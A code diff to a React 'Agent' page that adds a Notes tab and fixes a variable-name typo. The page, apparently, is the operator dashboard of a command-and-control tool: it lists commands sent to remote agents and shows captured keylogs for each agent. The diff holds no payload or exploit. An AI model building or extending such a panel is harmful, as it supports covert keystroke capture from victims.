@@ -21,6 +21,11 @@ const Agent = () => {
   const [saveError, setSaveError] = useState(null);
   const [isSaving, setIsSaving] = useState(false);
 
+  // States related to Notes tab
+  const [notes, setNotes] = useState('');
+  const [notesError, setNotesError] = useState(null);
+  const [isSavingNotes, setIsSavingNotes] = useState(false);
+
   const location = useLocation();
   const lockedTabs = ['configuration', 'notes'];
 
@@ -38,7 +43,8 @@ const Agent = () => {
       const queryParam = getQueryParam('agt');
       const agentResponse = await axios.get(`/api/agent/${queryParam}`);
       const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
-      const keylogsResonse = await axios.get(`/api/keylog/${queryParam}`);
+      const keylogsResponse = await axios.get(`/api/keylog/${queryParam}`);
+      const notesResponse = await axios.get(`/api/notes/${queryParam}`);
       const responseData = agentResponse.data.data;
 
       if (responseData) {
@@ -55,10 +61,15 @@ const Agent = () => {
       } else {
         setCommands([]);
       }
-      if (keylogsResonse.data.data) {
-        setKeylogs(keylogsResonse.data.data);
+      if (keylogsResponse.data.data) {
+        setKeylogs(keylogsResponse.data.data);
       } else {
         setKeylogs([]);
+      }
+      if (notesResponse.data.data && notesResponse.data.data.length > 0) {
+        setNotes(notesResponse.data.data[0].note || '');
+      } else {
+        setNotes('');
       }
     } catch (err) {
       setError(err.message);
@@ -163,6 +174,39 @@ const Agent = () => {
     </div>
   );
 
+  const handleSaveNotes = async () => {
+    try {
+      setIsSavingNotes(true);
+      setNotesError(null);
+
+      const queryParam = getQueryParam('agt');
+      const notesBody = { notes: notes };
+      await axios.put(`/api/notes/${queryParam}`, notesBody);
+
+      setIsSavingNotes(false);
+    } catch (err) {
+      setNotesError('Failed to save notes');
+      setIsSavingNotes(false);
+    }
+  };
+
+  const renderNotesTab = () => (
+    <div className="notes-tab">
+      <textarea
+        value={notes}
+        onChange={(e) => setNotes(e.target.value)}
+        placeholder="Enter your notes here"
+        rows={10}
+        cols={50}
+        disabled={isSavingNotes}
+      />
+      <button onClick={handleSaveNotes} disabled={isSavingNotes}>
+        {isSavingNotes ? 'Saving...' : 'Save Notes'}
+      </button>
+      {notesError && <p className="error">{notesError}</p>}
+    </div>
+  );
+
   const renderKeylogsTab = () => (
     <div className="keylogs-list">
       {keylogs.length === 0 ? (
@@ -177,7 +221,7 @@ const Agent = () => {
         </ul>
       )}
     </div>
-  );  
+  );
 
   const renderConfigurationTab = () => (
     <div>
@@ -259,12 +303,19 @@ const Agent = () => {
           >
             Configuration
           </button>
+          <button
+            className={activeTab === 'notes' ? 'active' : ''}
+            onClick={() => setActiveTab('notes')}
+          >
+            Notes
+          </button>
         </div>
 
         <div className="tab-content">
           {activeTab === 'commands' && renderCommandsTab()}
           {activeTab === 'keys' && renderKeylogsTab()}
           {activeTab === 'configuration' && renderConfigurationTab()}
+          {activeTab === 'notes' && renderNotesTab()}
         </div>
       </div>
     </div>
